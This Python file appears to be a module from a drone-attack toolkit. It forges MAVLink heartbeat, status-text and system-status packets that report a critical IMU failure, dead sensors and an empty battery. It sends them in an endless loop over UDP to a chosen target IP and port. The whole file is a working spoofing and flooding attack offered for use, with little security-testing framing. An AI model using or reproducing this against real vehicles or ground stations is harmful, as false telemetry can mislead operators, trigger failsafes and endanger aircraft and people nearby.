from core.base import BaseModule
from scapy.all import *
import time
import sys

class SystemFaultInjectionModule(BaseModule):
    def __init__(self):
        super().__init__(
            name="System Fault Injection",
            description="Simulates a critical system fault by sending heartbeat, STATUSTEXT, and SYS_STATUS messages indicating a critical error.",
            category="Signal Manipulation"
        )
        self.options = {
            "target_ip": {"value": "", "required": True, "description": "Target IP address"},
            "target_port": {"value": 14550, "required": True, "description": "Target port"}
        }

    def create_heartbeat(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        heartbeat = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
            base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
            custom_mode=3,
            system_status=mavutil.mavlink.MAV_STATE_CRITICAL
        )
        
        return heartbeat.pack(mav)

    def create_statustext(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        statustext = mav.statustext_encode(
            severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL,
            text="CRITICAL ERROR: IMU FAILURE".encode('utf-8')
        )
        
        return statustext.pack(mav)

    def create_sys_status(self):
        mav = mavutil.mavlink.MAVLink(None)
        mav.srcSystem = 1
        mav.srcComponent = 1

        sys_status = mav.sys_status_encode(
            onboard_control_sensors_present=0b11111111111111111111111111111111,
            onboard_control_sensors_enabled=0b11111111111111111111111111111111,
            onboard_control_sensors_health=0b00000000000000000000000000000000,
            load=1000,
            voltage_battery=0,
            current_battery=0,
            battery_remaining=0,
            drop_rate_comm=1000,
            errors_comm=100,
            errors_count1=100,
            errors_count2=100,
            errors_count3=100,
            errors_count4=100
        )

        return sys_status.pack(mav)

    def run(self):
        target_ip = self.options["target_ip"]["value"]
        target_port = int(self.options["target_port"]["value"])

        while True:
            heartbeat_packet = self.create_heartbeat()
            statustext_packet = self.create_statustext()
            sys_status_packet = self.create_sys_status()

            self.send_mavlink_packet(heartbeat_packet, target_ip, target_port)
            self.send_mavlink_packet(statustext_packet, target_ip, target_port)
            self.send_mavlink_packet(sys_status_packet, target_ip, target_port)

            print(f"Sent heartbeat, STATUSTEXT, and SYS_STATUS packets to {target_ip}:{target_port} indicating a critical error")

    def send_mavlink_packet(self, packet_data, target_ip, target_port):
        packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
        send(packet)
